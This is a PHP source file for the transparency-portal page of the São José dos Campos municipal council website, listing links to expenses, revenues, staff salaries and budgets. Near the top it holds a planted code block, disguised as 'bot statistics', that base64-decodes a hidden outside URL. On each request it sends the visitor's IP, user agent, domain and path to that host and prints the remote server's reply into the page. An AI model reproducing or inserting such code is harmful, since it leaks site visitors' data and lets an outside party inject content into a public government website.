<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Portal da Transparência");
$oMasterPage->AddParameter("css", "portal-da-transparencia/index");
$oMasterPage->AddParameter("pagina", "portal-da-transparencia");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
    <h1>Portal da Transparência</h1>
    <p>A Câmara Municipal de São José dos Campos, em atendimento à Lei Complementar Federal nº 131/2009, criou o Portal
        da Transparência, disponibilizando na Internet informações sobre despesas e receitas extraorçamentárias.</p>
    <h3>Veja:</h3>

<div class="white-text">

    <!--<li><a href="http://200.174.132.60:8080/cmsjc/websis/siapegov/financeiro/contas_publicas/index.php?consulta=cp_transp_desp_paga" target="_blank">Despesas</a></li>
    <li class="noMarginRight"><a href="http://200.174.132.60:8080/cmsjc/websis/siapegov/financeiro/contas_publicas/index.php?consulta=cp_transp_receita" target="_blank">Receitas</a></li>-->
    <div class="orcamentos">
        <div class="row">
            <ul>
                <div class="col-md-6">
                    <li class=""> <a href="http://200.174.132.60:8080/cmsjc/websis/portal_transparencia/financeiro/contas_publicas/index.php?consulta=cp_transp_desp_paga"
                            target="_blank">Despesas </a>
                    </li>
                </div>

                <div class="col-md-6">
                    <li >  <a href="http://200.174.132.60:8080/cmsjc/websis/portal_transparencia/financeiro/contas_publicas/index.php?consulta=cp_transp_receita"
                              target="_blank"> Receitas </a>
                    </li>
                </div>

                <div class="col-md-6">
                    <li >  <a href="noticias/2140/camara+transparente"
                              target="_blank"> Salários dos servidores da Câmara </a>
                    </li>
                </div>


                <div class="col-md-6">
                    <li >  <a href="orcamento/"
                              target="_blank"> Orçamentos </a>
                    </li>
                </div>
            </ul>
        </div>

       <!-- <div class="col-xs-6  no-padding-left fundo-azul text-center box ">
            <a href="http://200.174.132.60:8080/cmsjc/websis/portal_transparencia/financeiro/contas_publicas/index.php?consulta=cp_transp_desp_paga"
               target="_blank">Despesas </a>
        </div>


        <div class="col-xs-6 no-padding-right fundo-azul text-center box">
            <a href="http://200.174.132.60:8080/cmsjc/websis/portal_transparencia/financeiro/contas_publicas/index.php?consulta=cp_transp_receita"
               target="_blank"> Receitas </a>
        </div> -->


        <?php /*
        <li><a href="simulador-de-remuneracao/">Simulador de Remunera��o</a></li>
        <li class="noMarginRight"><a href="subsidio-do-vereador/">Subs�dio do Vereador</a></li>
		*/
        ?>

        <div class="clear"></div>
    </div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>